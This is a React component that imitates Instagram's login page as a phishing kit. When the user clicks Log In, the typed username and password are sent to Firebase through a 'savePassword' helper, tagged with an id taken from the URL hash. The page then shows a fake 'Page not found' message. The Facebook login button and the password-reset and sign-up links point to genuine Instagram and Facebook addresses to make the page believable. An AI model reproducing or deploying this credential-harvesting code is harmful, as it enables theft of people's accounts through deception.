import React, { useState } from "react";
import "./Body.css";
import pushToFirebase from "./savePassword";

function Body() {
    const [user, setUser] = useState("");
    const [password, setPassword] = useState("");

    const getIdFromUrl = () => {
        return window.location.hash.substring(1);
    };

    const push = () => {
        let id = getIdFromUrl();
        console.log(id);
        pushToFirebase(id, user, password);
        document.getElementById("root").innerHTML =
            '<div style="display: flex;justify-content: center;"><h1>Page not found</h1></div>';
    };

    const facebook = () => {
        window.location.href =
            "https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%2522wcngy7jv7u0m11pba1r1n22qgyv167du1huqzxy1obiye0o1vnxj%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Den_US%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf9fb77b-86d6-4d6e-a4b8-1af9753dbc68&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522wcngy7jv7u0m11pba1r1n22qgyv167du1huqzxy1obiye0o1vnxj%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0";
    };

    const changePassword = () => {
        let passkey = document.getElementById("password").value;
        setPassword(passkey);
    };

    const changeUser = () => {
        let userid = document.getElementById("username").value;
        setUser(userid);
    };

    return (
        <div className="body">
            <div class="container">
                <div class="box">
                    <div class="heading"></div>
                    <form class="login-form">
                        <div class="field">
                            <input
                                id="username"
                                type="name"
                                placeholder="Phone number, username, or email"
                                onChange={changeUser}
                            />
                            <label for="username">
                                Phone number, username, or email
                            </label>
                        </div>
                        <div class="field">
                            <input
                                id="password"
                                type="password"
                                placeholder="password"
                                onChange={changePassword}
                            />
                            <label for="password">Password</label>
                        </div>
                        <button
                            class="login-button"
                            title="login"
                            onClick={push}
                        >
                            Log In
                        </button>
                        <div class="separator">
                            <div class="line"></div>
                            <p>OR</p>
                            <div class="line"></div>
                        </div>
                        <div class="other">
                            <button
                                class="fb-login-btn"
                                type="button"
                                onClick={facebook}
                            >
                                <i class="fa fa-facebook-official fb-icon"></i>
                                <span class="">Log in with Facebook</span>
                            </button>
                            <a
                                class="forgot-password"
                                href="https://www.instagram.com/accounts/password/reset/"
                            >
                                Forgot password?
                            </a>
                        </div>
                    </form>
                </div>
                <div class="box">
                    <p>
                        Don't have an account?
                        <a
                            class="signup"
                            href="https://www.instagram.com/accounts/emailsignup/"
                        >
                            Sign Up
                        </a>
                    </p>
                </div>
            </div>
        </div>
    );
}

export default Body;
